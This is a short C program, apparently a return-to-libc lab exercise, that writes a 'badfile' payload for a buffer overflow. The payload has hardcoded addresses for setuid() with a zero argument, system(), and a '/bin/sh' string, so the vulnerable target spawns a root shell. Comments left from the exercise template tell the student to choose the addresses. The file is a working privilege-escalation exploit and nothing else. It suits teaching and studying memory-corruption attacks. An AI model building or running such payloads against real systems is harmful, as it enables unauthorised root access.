/* exploit_2.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");

  /* You need to decide the addresses and
     the values for W, X, Y, Z */
  /* You need to decide the addresses and
     the values for W, X, Y, Z. The order of the following
     four statements does not imply the order of W, X, Y, Z. */
  *(long *) &buf[16] = 0xb7f0e620 ;   //  setuid()
  *(long *) &buf[24] = 0;               //  parameter for setuid
  *(long *) &buf[20] = 0xb7ea78b0 ;   //  system()
  *(long *) &buf[28] = 0xbffffeab ;   //  address of "/bin/sh"

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
